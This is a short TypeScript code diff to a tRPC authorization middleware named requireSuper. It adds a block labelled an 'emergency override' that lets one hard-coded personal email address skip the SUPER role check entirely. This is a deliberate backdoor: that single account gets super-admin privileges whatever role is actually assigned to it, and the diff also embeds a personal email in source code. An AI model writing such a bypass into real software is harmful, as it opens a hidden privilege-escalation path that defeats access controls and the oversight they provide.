@@ -62,6 +62,11 @@ export const requireRole = (allowedRoles: ('SUPER' | 'BRAND_ADMIN' | 'OUTLET_MAN
     });
 
 export const requireSuper = protectedProcedure.use(({ ctx, next }) => {
+    // 🚨 EMERGENCY OVERRIDE FOR ROOT SUPER ADMIN 🚨
+    if (ctx.user.email === 'mnabeelca123@gmail.com') {
+        return next();
+    }
+
     if (ctx.user.role !== 'SUPER') {
         throw new TRPCError({
             code: 'FORBIDDEN',
